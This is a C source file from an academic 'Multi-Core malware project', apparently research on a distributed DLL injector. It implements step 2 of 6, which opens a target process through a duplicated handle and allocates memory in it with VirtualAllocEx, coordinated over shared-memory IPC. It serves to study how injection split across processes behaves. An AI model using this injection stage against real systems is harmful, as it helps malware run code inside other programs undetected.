/* Multi-Core malware project
 * Distributed DLL Injector Example
 * Marcus Botacin - 2017
 * Federal University of Paraná (UFPR)
 */

/* Include block */
#include<Windows.h>
#include<stdio.h>
#include "IPC.h"

/* Open process */
HANDLE OPENPROC(int pid)
{
	HANDLE proc;
	proc= OpenProcess( 
 		PROCESS_QUERY_INFORMATION |
 		PROCESS_CREATE_THREAD     |
 		PROCESS_VM_OPERATION      |
		PROCESS_DUP_HANDLE |
 		PROCESS_VM_WRITE,          
 		TRUE, pid); 
	return proc;
}

/* Allocate -- using IPC */
void VIRTUALALLOC_IPC()
{
	PIPC data;
	HANDLE hMapFile;
	LPVOID map;

	/* Open IPC mappings */
	hMapFile = OpenFileMappingA(FILE_MAP_ALL_ACCESS,FALSE,map_name);               

	/* check */
	if(!hMapFile)
	{
		printf("OpenMap error\n");
		return;
	}

	map = MapViewOfFile(hMapFile,FILE_MAP_ALL_ACCESS,0,0,sizeof(IPC));
	/* check */
	if(!map)
	{
		printf("MapView error\n");
		return;
	}

	/* get data from IPC */
	data = (PIPC)map;

	/* debug print */
	//printf("PROC %x SIZE %x PARENTPID %x\n",data->proc,data->size,data->parent_pid);
	
	/* Open process handler also in this process */
	HANDLE hParent = OPENPROC(data->parent_pid);

	/* Duplicate process handler from other process */
	HANDLE dup;
	DuplicateHandle(hParent,data->proc,GetCurrentProcess(),&dup,0,TRUE,DUPLICATE_SAME_ACCESS);

	/* allocate mem and pass addr to other process */
	data->lib = VirtualAllocEx(dup, NULL, data->size, MEM_COMMIT, PAGE_READWRITE);

	/* wait for human */
	getchar();

	/* finish */
	UnmapViewOfFile(map);
    CloseHandle(hMapFile);
}

/* main */
int main()
{
	/* just perform IPC action */
	printf("2. 2/6 VirtualAlloc\n");
	VIRTUALALLOC_IPC();
	return 0;
}